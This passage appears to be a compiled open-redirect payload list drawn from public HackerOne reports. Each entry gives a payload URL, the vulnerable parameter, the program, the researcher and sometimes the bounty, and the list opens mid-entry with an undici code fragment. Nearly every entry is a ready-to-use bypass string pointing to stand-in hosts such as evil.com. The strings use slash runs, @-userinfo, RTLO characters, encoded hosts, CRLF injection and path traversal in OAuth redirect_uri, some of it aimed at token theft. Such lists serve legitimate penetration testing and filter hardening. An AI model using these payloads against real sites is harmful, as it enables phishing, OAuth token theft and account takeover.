console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
  console.log('data', data)
}
```

**Parameter:** `url`
— [Cookie headers are not cleared in cross-domain redirect in undici-fetch](https://hackerone.com/reports/2243710) · Internet Bug Bounty · [ranjit_p](https://hackerone.com/ranjit_p) · $405.0


## Open redirect to an external FTP URL using the url parameter

### `726423a6`

```
https://target.com/redirect?url=ftp://evil.com:1337
```

**Parameter:** `url`
— [protocol & Ports are not shown in third-party site redirect warning page ](https://hackerone.com/reports/459286) · Semrush · [0xprial](https://hackerone.com/0xprial)


## Open redirect by injecting a malicious URL into the redirect_uri parameter using directory traversal (../../)

### `bf33d3d3`

```
https://target.com/oauth/authorize?client_id=...&scope=read,post&redirect_uri=https://evil.com/../../redirect_url=https://evil2.com/a.php%2Fcomplete
```

**Parameter:** `redirect_uri`
— [Broken Authentication (including Slack OAuth bugs)](https://hackerone.com/reports/2559) · Slack · [anandpingsafe](https://hackerone.com/anandpingsafe)


## Open redirect using malformed redirect_uri with backslashes and CRLF

### `0d639fc4`

```
https://target.com/oauth/authorize?client_id=&redirect_uri=\\name.tld%0d%0axxx:something&response_type=code
```

**Parameter:** `redirect_uri`
— [Security bug https://target.com/oauth/authorize - CRLF Header injection via "redirect_uri" parameter](https://hackerone.com/reports/2147132) · Mozilla · [oja](https://hackerone.com/oja) · $200.0


## Open redirect using malformed URL with multiple slashes

### `1d44f8ed`

```
http:////target.com
```

— [Attacker can smuggle a malicious domain in a URI object.](https://hackerone.com/reports/156615) · Ruby · [djspinmonkey](https://hackerone.com/djspinmonkey)


## Open redirect using malicious return_to parameter

### `72bfe782`

```
https://target.com/user/edit?return_to=//evil.com
```

**Parameter:** `return_to`
— [Open Redirection while saving User account Settings ](https://hackerone.com/reports/288219) · Moneybird · [0xprial](https://hackerone.com/0xprial)


## Open redirect via malicious URL in redirect parameter

### `8bae7ce4`

```
https://target.com////evil.com/?target.com/?category=interview&page=2
```

— [Open Redirect](https://hackerone.com/reports/504751) · Omise · [jishnu_sudhakaran](https://hackerone.com/jishnu_sudhakaran) · $100.0


## Open redirect via a nested "rd" parameter containing an encoded malicious URL

### `a958b1eb`

```
https://target.com/daa/0/daa_optout_actions?action_id=4&rd=https%3A%2F%2Fddosecrets%25E3%2580%2582com%3F
```

**Parameter:** `rd`
— [Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links](https://hackerone.com/reports/1032610) · X / xAI · [jub0bs](https://hackerone.com/jub0bs) · $560.0


## Open‑redirect using a numeric IP (decimal) in the next parameter

### `104d78ac`

```
https://target.com/auth/login/?next=Http:3627732462
```

**Parameter:** `next`
— [Open redirection at https://target.com/auth/login/](https://hackerone.com/reports/411723) · Chaturbate · [shailesh4594](https://hackerone.com/shailesh4594)


## Open‑redirect (or SSRF) by supplying an external URL in the `app_style` parameter

### `813a7043`

```
app_style=https%3A%2F%2Fevil.com%2Fcss%2Funi_2fa_style.css
```

**Parameter:** `app_style`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)


## Open redirect via parameter u

### `847993a6`

```
https://target.com/redirect?u=http%3A%2F%2Fevil.com&t=38dc43d5f007f4c5d974f6c74f065158&g=user-profile-website
```

**Parameter:** `u`
— [Unvalidated redirect on user profile website](https://hackerone.com/reports/143265) · Eternal · [roshanpty](https://hackerone.com/roshanpty)


## Open redirect using the 'to' parameter with URL‑encoded external link

### `bd86ea1f`

```
https://target.com/go?to=%68%74%74%70%3A%2F%2F%67%6F%6F%67%6C%65%2E%63%6F%6D%2F%61%6D%70%2F%25%36%37%25%36%46%25%36%46%25%36%37%25%36%43%25%36%35%25%32%45%25%36%33%25%36%46%25%36%44%25%32%46%25%37%35%25%37%32%25%36%43%25%33%46%25%37%33%25%36%31%25%33%44%25%37%34%25%32%36%25%37%35%25%37%32%25%36%43%25%33%44%25%34%38%25%35%34%25%35%34%25%35%30%25%32%35%25%33%33%25%34%31%25%32%35%25%33%32%25%34%36%25%32%35%25%33%32%25%34%36%25%36%35%25%37%38%25%36%31%25%36%44%25%37%30%25%36%43%25%36%35%25%32%45%
```

**Parameter:** `to`
— [target.com - Bypass of restrictions on external links.](https://hackerone.com/reports/956449) · Avito · [hen51](https://hackerone.com/hen51)


## Open‑redirect payload consisting of leading slashes followed by a malicious domain, supplied to the `next` parameter

### `8b3b3f2c`

```
////////////////////////////evil.com
```

**Parameter:** `next`
— [\[https://█████████/\]&&\[https://█████████/\] Open Redirection](https://hackerone.com/reports/537047) · Lyst · [mandark](https://hackerone.com/mandark)


## Open redirect payload using double slash and encoded ".." in the URL

### `c8bccb07`

```
http://<domain_name>//target.com/%2e%2e
```

— [Open redirect in fastify-static via mishandled user's input when attempt to redirect](https://hackerone.com/reports/1354255) · Fastify · [drstrnegth](https://hackerone.com/drstrnegth)


## Open‑redirect payload using an encoded external URL in the `jump.php` redirect parameter

### `e3365d79`

```
https://target.com/jump.php?https%3A%2F%2Fevil.com%2Fabc
```

— [Open redirect protection (https://target.com/jump.php) is broken for novels](https://hackerone.com/reports/541862) · pixiv · [katsuragicsl](https://hackerone.com/katsuragicsl) · $200.0


## Open‑redirect payload using a long sequence of slashes in the `next` parameter to bypass validation

### `a85a10ee`

```
https://███/account/login/?next=///////////////////////////evil.com
```

**Parameter:** `next`
— [\[https://█████████/\]&&\[https://█████████/\] Open Redirection](https://hackerone.com/reports/537047) · Lyst · [mandark](https://hackerone.com/mandark)


## Open redirect payload using protocol‑relative URL

### `0269e977`

```
//evil.com/
```

— [Open Redirect in the Path of target.com](https://hackerone.com/reports/692154) · Vend VDP · [zoidsec](https://hackerone.com/zoidsec)


## Open redirect by providing an attacker‑controlled URL in the redirect_uri parameter of Phabricator OAuth server

### `659d3ca0`

```
https://target.com/oauthserver/auth/?redirect_uri=http://evil.com&response_type=code&client_id=PHID-OASC-oyfqtnanxsukiw5lsnce&scope=ggg
```

**Parameter:** `redirect_uri`
— [OAuth Stealing Attack (New)](https://hackerone.com/reports/3930) · Phabricator · [krangbuster](https://hackerone.com/krangbuster) · $400.0


## Open redirect using query part with @ (attacker.com?@www.target.com) in callback_url after decoding

### `cad89fd3`

```
https://attacker.com?@www.target.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)


## Open redirect using the 'redirect_uri' parameter in an OAuth flow

### `b52bc00f`

```
https://target.com/dialog/oauth?client_id=569627156411038&redirect_uri=https%3A%2F%2Fevil2.com%2Ffiles-pri%2FT025M9QPZ-F0283NJ20%2Fhash.swf&response_type=token&scope=user_photos&sdk=joey
```

**Parameter:** `redirect_uri`
— [Facebook Takeover using Slack using 302 from target.com with access_token](https://hackerone.com/reports/6017) · Slack · [fransrosen](https://hackerone.com/fransrosen)


## Open redirect via the return_to parameter containing a path traversal to an external domain

### `bdc78e4d`

```
https://<shop>.target.com/admin/bulk?resource_name=Product&return_to=/..//evil.com
```

**Parameter:** `return_to`
— [Open redirect in bulk edit](https://hackerone.com/reports/169759) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)


## Open redirect via return_path parameter

### `02787d6b`

```
https://target.com/logout?from_mobile=true&return_path=//evil.com
```

**Parameter:** `return_path`
— [Open/Unvalidated Redirect Issue](https://hackerone.com/reports/77221) · Mavenlink · [bugs3ra](https://hackerone.com/bugs3ra)


## Open redirect via returnTo parameter

### `d1db81a4`

```
https://target.com/logout?returnTo=///evil.com/
```

**Parameter:** `returnTo`
— [Open redirect filter bypass](https://hackerone.com/reports/76738) · Zaption · [jayden](https://hackerone.com/jayden)


## Open redirect using Right‑to‑Left Override (RTLO) Unicode character in the URL

### `a9289b24`

```
[Just Click Here](https://target.com@%E2%80%AE@moc.rettiwt)
```

— [Domain spoofing in redirect page using RTLO](https://hackerone.com/reports/299403) · HackerOne · [ashish_r_padelkar](https://hackerone.com/ashish_r_padelkar)


## Open redirect via scheme‑relative URL (//target.com) supplied in the request URL

### `9e9f6fec`

```
https://target.com//evil2.com/
https://evil.com//evil2.com/
```

— [\[target.com / evil.com\] Open Redirect](https://hackerone.com/reports/163124) · Skyliner · [bobrov](https://hackerone.com/bobrov)


## Open redirect by supplying an unvalidated 'url' parameter (base64‑encoded target) to exit.php

### `3ed5382d`

```
https://target.com/exit.php?url=aHR0cHM6Ly9nb29nbGUuY29t
```

**Parameter:** `url`
— [Open redirect in Serendipity (exit.php)](https://hackerone.com/reports/373932) · Hanno's projects · [bb9866f3f743d6bf69b6836](https://hackerone.com/bb9866f3f743d6bf69b6836)


## Open redirect by supplying userinfo (username) before @ in callback_url

### `8bee0f7b`

```
https://whatever@www.target.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)


## Open redirect through path traversal in the URL field to reach a redirect endpoint

### `d3fa2d5d`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/#\/\/statements?month=03&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"style
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)


## Open redirect with token leakage via 'continue' parameter

### `479c3c86`

```
https://target.com/transfer_auth?key=<TOKEN>&continue=/
```

**Parameter:** `continue`
— [1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation](https://hackerone.com/reports/3723458) · Khan Academy · [farr](https://hackerone.com/farr)


## Open redirect via unvalidated 'fallback' URL parameter

### `bc618fe1`

```
https://target.com/d4ffbnr?campaign=brand-nov&adgroup=native&creative=link-liquidity%20&fallback=https%3A%2F%2Fevil2.com%2F%3Futm_source%3Dcryptomonday%26utm_campaign%3Dbrand-nov%26utm_medium%3Dnative%26utm_content%3Dlink-liquidity%20
```

**Parameter:** `fallback`
— [Open Redirect on https://target.com/](https://hackerone.com/reports/967284) · Nuri · [soe_htet](https://hackerone.com/soe_htet)


## Open redirect using URL authority bypass with @ to point to an external domain

### `9561cabd`

```
https://target.com%2f@google.com
```

— [prevent %2f spoofed URLs in profile statement](https://hackerone.com/reports/128910) · Gratipay · [007divyachawla](https://hackerone.com/007divyachawla)


## Open redirect using a URL‑encoded malicious host in the "rd" parameter

### `94aea291`

```
https%3A%2F%2Fddosecrets%25E3%2580%2582com
```

**Parameter:** `rd`
— [Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links](https://hackerone.com/reports/1032610) · X / xAI · [jub0bs](https://hackerone.com/jub0bs) · $560.0


## Open redirect with URL suffix to bypass whitelist in the `url` parameter

### `74e6cfe7`

```
https://target.com/redirect?url=https://evil.com/search?q=REST+API+SUFFIX
```

**Parameter:** `url`
— [\[H1-2006 2020\] CTF writeup](https://hackerone.com/reports/892632) · h1-ctf · [0xbeefed](https://hackerone.com/0xbeefed)


## Open redirect using username@host syntax to spoof the displayed domain

### `d985b29e`

```
http://username@domain.com
```

— [Domain spoofing in redirect page using RTLO](https://hackerone.com/reports/299403) · HackerOne · [ashish_r_padelkar](https://hackerone.com/ashish_r_padelkar)


## Path‑traversal in API endpoint combined with open redirect using the `url` parameter

### `def37dc7`

```
https://target.com/api/accounts/../../redirect?url=https://evil.com/#/statements?month=03&year=2020
```

**Parameter:** `url`
— [\[H1-2006 2020\] CTF writeup](https://hackerone.com/reports/892632) · h1-ctf · [0xbeefed](https://hackerone.com/0xbeefed)


## Path traversal to trigger a redirect, injected via the account_id property in a JSON token

### `a5578309`

```
{"account_id":"F8gHiqSdpK/../../../redirect?url=https://target.com/
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)
